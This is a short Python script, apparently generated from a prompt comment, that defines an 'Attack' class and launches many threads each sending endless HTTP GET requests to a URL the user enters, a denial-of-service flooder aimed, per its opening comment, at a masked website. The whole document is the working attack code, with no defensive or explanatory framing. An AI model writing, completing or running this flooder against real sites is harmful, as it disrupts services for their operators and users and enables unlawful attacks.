# define a class to perform denial of service attack and perform denial of service attack on https://www.xxxxxxx.xxx.xx/ 

import requests
import threading
import time 

class Attack:
    def __init__(self, url, numberOfAttacks):
        self.url = url
        self.numberOfAttacks = numberOfAttacks

    def performAttack(self):
        while True:
            try:
                requests.get(self.url)
                print("Attack Sent")
            except:
                print("Failed Attack")

url = input("Enter URL: ")
numberOfAttacks = int(input("Enter number of attacks: "))

for i in range(numberOfAttacks):
    t = threading.Thread(target = Attack(url, numberOfAttacks).performAttack)
    t.start()